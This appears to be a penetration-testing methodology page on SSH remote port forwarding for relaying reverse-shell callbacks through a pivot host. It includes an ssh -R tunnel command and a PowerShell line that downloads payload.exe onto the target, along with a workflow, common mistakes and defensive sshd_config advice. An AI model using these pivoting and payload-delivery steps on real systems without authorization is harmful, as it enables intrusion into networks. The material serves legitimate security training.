---
layout: page
title: "SSH Remote Port Forwarding"
subtitle: "Letting a target that cannot reach the attack host call back through a listener on the pivot"
permalink: /methodology/pivoting/ssh-remote-forwarding/
---

SSH remote port forwarding (`-R`) asks the SSH server to listen on a port and send every connection that arrives there back to the attack host. It solves the reverse-shell problem where the target can open connections to the pivot but cannot open any connection to the attack host. The callback goes to the pivot, and the SSH session carries it home.

## Workflow

1. Confirm the target can reach the pivot's internal address but has no route or firewall path to the attack host.
2. Build a payload that calls back to the pivot's internal address on a chosen port.
3. Start a listener on the attack host on the port the SSH session will forward to.
4. Start the remote forward from the attack host, so the pivot listens on the internal interface and relays to the local listener.
5. Copy the payload to the target through the pivot, or serve it from the pivot with a temporary web server.
6. Run the payload on the target and confirm the session arrives at the attack host listener.

```bash
attacker$ ssh -R PIVOT_INTERNAL_IP:8080:0.0.0.0:8000 USERNAME@PIVOT_IP -vN
```

The `-vN` flags make the session verbose and stop SSH from opening a login shell, so the tunnel stays up without an interactive prompt.

The target then reaches the callback through the pivot:

```powershell
PS C:\> Invoke-WebRequest -Uri "http://PIVOT_INTERNAL_IP:8123/payload.exe" -OutFile "C:\payload.exe"
```

## What to look for

- The forward string has three parts: the listen address and port on the pivot, the destination host and port on the attack host. Reversing them is the most common mistake.
- The listener on the attack host must already be running when the payload connects. Start it first, then start the forward.
- The verbose output of `ssh -v` shows whether the remote listen request was accepted. A message that the server refused the forward usually means `GatewayPorts` or `AllowTcpForwarding` is restricting it on the pivot.

## Pitfalls

> The pivot needs to bind the listen port on the internal interface. If the listen address is `localhost` only, the target cannot reach it.
{: .warning }

- Ports below 1024 need root on the pivot, so pick a higher port.
- The forward lives only as long as the SSH session. A dropped session silently kills every callback that depends on it.
- A payload built for the wrong interface or port connects to nothing. Check the address in the payload against the pivot's internal NIC before transferring it.

## Defense and prevention

Set `AllowTcpForwarding no` (or `no` for `GatewayPorts`) in `sshd_config` on hosts that do not need it. Restrict outbound connections from servers to known destinations, and monitor for SSH sessions that create listeners on unexpected ports on internal interfaces.
